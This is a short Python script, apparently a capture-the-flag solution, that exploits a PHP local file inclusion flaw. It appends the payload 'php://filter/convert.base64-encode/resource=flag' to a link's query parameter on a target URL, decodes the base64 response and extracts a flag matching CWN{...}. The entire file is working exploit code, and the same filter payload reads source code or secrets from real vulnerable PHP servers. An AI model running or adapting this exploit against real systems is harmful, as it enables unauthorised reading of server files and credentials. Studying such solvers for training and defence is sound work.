#!/usr/bin/env python

import re
import sys
import requests
from bs4 import BeautifulSoup as bs

patt= re.compile('(CWN\{[^\{}]*\})')

payload = "=php://filter/convert.base64-encode/resource=flag"

usage = "usage: %s <url>" % sys.argv[0]

if len(sys.argv) < 2:
    exit(usage)

url = sys.argv[1]
html = requests.get(url).text
soup = bs(html,"html5lib")
page = soup.a.get('href').split('=')[0]
html = requests.get(url + page + payload).text
soup = bs(html,"html5lib")
div = soup.div
flag = div.text.decode('base64')
matches = patt.findall(flag)
if matches:
    print matches[0]
